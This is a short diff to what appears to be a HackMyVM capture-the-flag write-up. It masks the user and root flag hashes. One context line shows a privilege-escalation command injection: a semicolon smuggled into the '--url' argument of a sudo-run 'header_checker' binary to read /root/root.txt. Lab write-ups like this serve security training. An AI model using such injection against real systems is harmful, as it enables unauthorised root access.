@@ -240,7 +240,7 @@ drwxr-xr-x 3 shrek shrek  4096 Jan  4 05:58 .local
 
 shrek@swamp:~$ cat user.txt
 
-7d199d72f12135ef193ad19faf9468ef 🚩
+7d199*************************** 🚩
 ```
 
 **Linux Privilege Escalation**
@@ -323,7 +323,7 @@ drwx------  2 root root 4096 Feb 12  2024 .ssh
 
 shrek@swamp:~$ sudo ./header_checker --url "google.com; cat /root/root.txt"
 
-9c7bddee2e2fb8ad03854f106f23c6b5 🚩
+9c7bd*************************** 🚩
 ```
 
 <img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>
